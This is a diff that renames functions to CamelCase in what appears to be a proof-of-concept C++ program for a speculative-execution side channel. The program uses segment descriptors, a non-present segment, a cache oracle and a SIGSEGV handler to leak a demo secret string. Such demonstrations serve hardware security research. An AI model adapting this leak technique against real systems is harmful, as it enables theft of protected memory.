@@ -59,7 +59,7 @@ const char *private_data = " It's a s3kr3t!!!";
 const char *public_data = "Hello, world!";
 
 // Sets up a segment descriptor in the local descriptor table.
-static void setup_segment(int index, const char *base, bool present) {
+static void SetupSegment(int index, const char *base, bool present) {
   // See: Intel SDM volume 3a "3.4.5 Segment Descriptors".
   struct user_desc table_entry;
   memset(&table_entry, 0, sizeof(struct user_desc));
@@ -87,7 +87,7 @@ static void setup_segment(int index, const char *base, bool present) {
   }
 }
 
-static char leak_byte(size_t offset) {
+static char LeakByte(size_t offset) {
   CacheSideChannel sidechannel;
   const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
 
@@ -98,7 +98,7 @@ static char leak_byte(size_t offset) {
     // First we have to setup the private segment as present, because otherwise
     // the write to ES would fail with SIGBUS on some Intel CPUs. We use index
     // 1 because index 0 is occupied by the public data segment.
-    setup_segment(1, private_data, true);
+    SetupSegment(1, private_data, true);
 
     // Assigning FS to the segment that points to public data and ES to the
     // segment that points to private data.
@@ -111,7 +111,7 @@ static char leak_byte(size_t offset) {
     // Making the segment that points to private data non present - that means
     // that each access to it architecturally fails. Just rewriting the
     // descriptor on index 1 with a non-present one.
-    setup_segment(1, private_data, false);
+    SetupSegment(1, private_data, false);
 
     // Block all speculation and memory forwarding with CPUID. Otherwise we
     // would get false positives on many Intel CPUs that allow speculation on
@@ -157,7 +157,7 @@ static char leak_byte(size_t offset) {
   }
 }
 
-static void sigsegv(
+static void Sigsegv(
     int /* signum */, siginfo_t * /* siginfo */, void *context) {
   // SIGSEGV signal handler.
   // Moves the instruction pointer to the "afterspeculation" label.
@@ -166,23 +166,23 @@ static void sigsegv(
       reinterpret_cast<greg_t>(afterspeculation);
 }
 
-static void set_signal() {
+static void SetSignal() {
   struct sigaction act;
-  act.sa_sigaction = sigsegv;
+  act.sa_sigaction = Sigsegv;
   act.sa_flags = SA_SIGINFO;
   sigaction(SIGSEGV, &act, NULL);
 }
 
 int main() {
-  set_signal();
+  SetSignal();
   // Setup the public data segment descriptor on index 0. It is always present.
-  setup_segment(0, public_data, true);
+  SetupSegment(0, public_data, true);
   std::cout << "Leaking the string: ";
   std::cout.flush();
   // Avoid the first dummy character that would be accessible using zero
   // segment limit. Therefore starting from index 1.
   for (size_t i = 1; i < strlen(private_data); ++i) {
-    std::cout << leak_byte(i);
+    std::cout << LeakByte(i);
     std::cout.flush();
   }
   std::cout << "\nDone!\n";
